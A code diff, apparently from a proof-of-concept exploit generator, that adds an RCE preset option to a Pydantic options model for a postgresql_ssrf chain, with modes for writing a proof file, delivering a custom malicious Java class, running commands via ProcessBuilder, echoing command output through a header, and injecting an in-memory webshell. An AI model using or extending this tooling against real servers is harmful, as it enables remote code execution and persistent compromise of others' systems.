@@ -22,6 +22,25 @@ EchoEngineField = Literal[
     "dfs",
 ]
 
+RcePresetField = Literal["file", "custom", "exec", "echo", "memshell"]
+
+
+def normalize_rce_preset(
+    preset: RcePresetField | str,
+    *,
+    echo: bool = False,
+    memshell: bool = False,
+) -> RcePresetField:
+    """file/custom/exec/echo/memshell 统一为预设；旧 bool 标志可覆盖。"""
+    if memshell:
+        return "memshell"
+    if echo:
+        return "echo"
+    p = (preset or "file").strip().lower()
+    if p in ("file", "custom", "exec", "echo", "memshell"):
+        return p  # type: ignore[return-value]
+    return "file"
+
 
 
 class Poc1268GenerateOptions(BaseModel):
@@ -55,12 +74,28 @@ class Poc1268GenerateOptions(BaseModel):
         "currency",
         description="Currency MiscCodec 字段：currency 或 currencyCode",
     )
-    echo: bool = Field(False, description="postgresql_ssrf 回显")
-    engine: EchoEngineField = Field("auto", description="回显引擎")
-    cmd: str = Field("id", description="回显默认命令")
-    cmd_header: str = Field("X-Cmd", description="命令请求头")
+    preset: RcePresetField = Field(
+        "file",
+        description=(
+            "postgresql_ssrf 预设：file=写证明文件（默认）；"
+            "custom=自备 class 投递；exec=ProcessBuilder；"
+            "echo=命令回显；memshell=内存马"
+        ),
+    )
+    class_b64: Optional[str] = Field(
+        None, description="preset=custom 时的恶意 .class Base64"
+    )
+    echo: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=echo"
+    )
+    engine: EchoEngineField = Field("auto", description="回显引擎（preset=echo）")
+    cmd: str = Field("id", description="回显默认命令 / preset=exec 执行命令")
+    cmd_header: str = Field("X-Cmd", description="命令请求头（preset=echo）")
     attack_base: Optional[str] = Field(None, description="回显/内存马资源托管基址")
-    memshell: bool = Field(False, description="注入内存马（与 echo 互斥；仅 postgresql_ssrf）")
+    memshell: bool = Field(
+        False,
+        description="兼容旧字段：true 等价于 preset=memshell（仅 postgresql_ssrf）",
+    )
     ms_api: str = Field(
         "jar",
         description="jar=内置 memshell-gen.jar；或 http(s)://... MemShellParty boot",
